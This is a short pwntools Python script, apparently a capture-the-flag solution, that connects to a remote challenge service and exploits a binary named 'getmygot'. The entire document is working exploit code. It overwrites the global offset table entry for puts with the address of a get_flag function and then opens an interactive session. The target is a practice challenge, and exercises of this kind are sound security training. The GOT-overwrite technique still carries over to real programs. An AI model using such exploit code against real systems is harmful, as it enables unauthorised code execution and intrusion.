from pwn import *

#p = process('getmygot')
p = remote('forever.isss.io',1307)
e = ELF('build/getmygot')
p.recvline()
p.sendline(str(e.got['puts']))
p.sendline(str(e.sym['get_flag']))
p.interactive()
